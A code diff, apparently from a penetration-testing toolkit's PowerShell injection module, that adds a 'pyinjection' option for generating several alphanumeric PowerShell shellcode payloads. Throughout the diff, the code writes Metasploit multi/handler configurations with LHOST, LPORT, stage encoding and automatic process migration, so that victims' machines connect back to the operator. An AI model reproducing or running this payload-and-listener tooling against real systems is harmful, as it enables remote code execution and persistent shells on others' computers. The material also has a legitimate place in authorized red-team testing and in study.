@@ -15,6 +15,15 @@ port = check_options("PORT=")
 # check if we are using auto_migrate
 auto_migrate = check_config("AUTO_MIGRATE=")
 
+# check if we are using pyinjection
+pyinjection = check_options("PYINJECTION=")
+if pyinjection == "ON":
+    # check to ensure that the payload options were specified right
+    if os.path.isfile(setdir + "/payload_options.shellcode"):
+          pyinjection = "on"
+          print_status("Multi/Pyinjection was specified. Overriding config options.")
+    else: pyinjection = "off"
+
 # grab ipaddress
 if check_options("IPADDR=") != 0:
     ipaddr = check_options("IPADDR=")
@@ -24,6 +33,9 @@ else:
 
 # check to see if we are using multi powershell injection
 multi_injection = check_config("POWERSHELL_MULTI_INJECTION=").lower()
+
+# turn off multi injection if pyinjection is specified
+if pyinjection == "on": multi_injection = "off"
 
 # check what payloads we are using
 powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
@@ -37,38 +49,41 @@ if validate_ip(ipaddr) == False:
 if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
     # if we have multi injection on, don't worry about these
     if multi_injection != "on":
-        print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
-        port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
-        if port == "": port = "443"
-        fileopen = file("%s/meta_config_multipyinjector" % (setdir), "r")
-        data = fileopen.read()
-        match = re.search(port, data)
-        if not match:
-            filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
-            filewrite.write("\nuse exploit/multi/handler\n")
-            if auto_migrate == "ON":
-                filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-            filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding true\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port))
-            filewrite.close()
+        if pyinjection == "off":
+            print_status("POWERSHELL_INJECTION is set to ON with multi-pyinjector")
+            port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
+            if port == "": port = "443"
+            fileopen = file("%s/meta_config_multipyinjector" % (setdir), "r")
+            data = fileopen.read()
+            match = re.search(port, data)
+            if not match:
+                filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
+                filewrite.write("\nuse exploit/multi/handler\n")
+                if auto_migrate == "ON":
+                    filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
+                filewrite.write("set PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset EnableStageEncoding true\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, ipaddr, port))
+                filewrite.close()
 
 # if we have multi injection on, don't worry about these
 if multi_injection != "on":
-    # check to see if the meta config multi pyinjector is there
-    if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
-        if check_options("PORT=") != 0:
-            port = check_options("PORT=")
-        # if port.options isnt there then prompt
-        else:
-            port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
-            if port == "": port = "443"
-            update_options("PORT=" + port)
+    if pyinjection == "off":
+        # check to see if the meta config multi pyinjector is there
+        if not os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
+            if check_options("PORT=") != 0:
+                port = check_options("PORT=")
+            # if port.options isnt there then prompt
+            else:
+                port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
+                if port == "": port = "443"
+                update_options("PORT=" + port)
 
 # turn off multi_injection if we are riding solo from the powershell menu
 if powershell_solo == "ON": multi_injection = "off"
 
 # if we are using multi powershell injection
 if multi_injection == "on":
-    print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")
+    if pyinjection == "off":
+        print_status("Multi-Powershell-Injection is set to ON, this should be sweet...")
 
 # define a base variable
 x86 = ""
@@ -115,13 +130,31 @@ if multi_injection == "on":
                     filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding true\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
                     filewrite.close()
 
+# here we do everything if pyinjection or multi pyinjection was specified
+if pyinjection == "on":
+    multi_injection_x86 = ""
+    # read in the file we need for parsing
+    fileopen = file(setdir + "/payload_options.shellcode", "r")
+    payloads = fileopen.read()[:-1].rstrip() # strips an extra ,
+    payloads = payloads.split(",")
+    # format: payload<space>port
+    for payload in payloads:
+        #format: payload<space>port
+        payload = payload.split(" ")
+        powershell_inject_x86 = payload[0]
+        port = payload[1]        
+        print_status("Generating x86-based powershell injection code...")
+        multi_injection_x86 = multi_injection_x86 + "," + generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
+        print port
+
 # if its turned to off
 if multi_injection == "off":
-    print_status("Generating x86-based powershell injection code...")
-    x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
+    if pyinjection == "off":
+        print_status("Generating x86-based powershell injection code...")
+        x86 = generate_powershell_alphanumeric_payload(powershell_inject_x86, ipaddr, port, x86)
 
 # if we are specifying multi powershell injection
-if multi_injection == "on":
+if multi_injection == "on" or pyinjection == "on":
     x86 = multi_injection_x86[1:] # remove comma at beginning
 
 # check to see if we want to display the powershell command to the user
